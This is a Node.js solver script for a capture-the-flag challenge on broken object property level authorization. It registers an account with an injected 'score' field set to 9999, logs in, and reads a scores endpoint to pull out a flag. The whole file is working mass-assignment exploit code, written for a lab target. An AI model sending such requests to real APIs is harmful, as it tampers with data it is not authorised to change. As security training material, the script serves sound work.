/**
 * Challenge: 0xa3 - Broken Object Property Level Authorization
 * Exploit: Register with score property > 1000, then check /api/scores
 */

const crypto = require('crypto');
const { createLogger, httpRequest, extractFlag } = require('../utils');

async function run(token, baseUrl, testUser, testPass) {
    const { log, saveFlag } = createLogger('0xa3');
    log('Starting 0xa3 exploit: Broken Object Property Level Authorization');

    // Create a new user with high score
    const exploitUser = `exploit3_${Date.now()}`;
    const exploitPass = 'pass123';

    log('Registering user with manipulated score property...');
    const registerResult = await httpRequest(`${baseUrl}/api/register`, {
        method: 'POST',
        body: JSON.stringify({
            username: exploitUser,
            password: exploitPass,
            score: 9999, // Manipulated score
        }),
    });

    log(`Register response: ${JSON.stringify(registerResult.data)}`);

    // Login to get token for this user
    const loginResult = await httpRequest(`${baseUrl}/api/login`, {
        method: 'POST',
        body: JSON.stringify({
            username: exploitUser,
            password: exploitPass,
        }),
    });

    let exploitToken = token; // Fallback to original token
    if (loginResult.data && loginResult.data.token) {
        exploitToken = loginResult.data.token;
    } else if (loginResult.data && loginResult.data.status === 'success') {
        // Token might be in cookie, but we'll try with original token
        log('⚠️  Could not extract token, using original token');
    }

    // Check scores endpoint
    log('Checking /api/scores endpoint...');
    const scoresResult = await httpRequest(`${baseUrl}/api/scores`, {
        method: 'GET',
        headers: {
            'Authorization': `Bearer ${exploitToken}`,
        },
    });

    log(`Scores response: ${JSON.stringify(scoresResult.data)}`);

    // Check if flag is in response
    const flag = extractFlag(JSON.stringify(scoresResult.data));
    if (flag) {
        saveFlag(flag);
        return { success: true, flag };
    }

    // Check if manipulated score is present
    if (JSON.stringify(scoresResult.data).includes('9999')) {
        log('✅ Exploit successful - score manipulation worked');
        log('Response contains manipulated score');
        return { success: true };
    }

    log('❌ Exploit may have failed');
    return { success: false };
}

module.exports = { run };
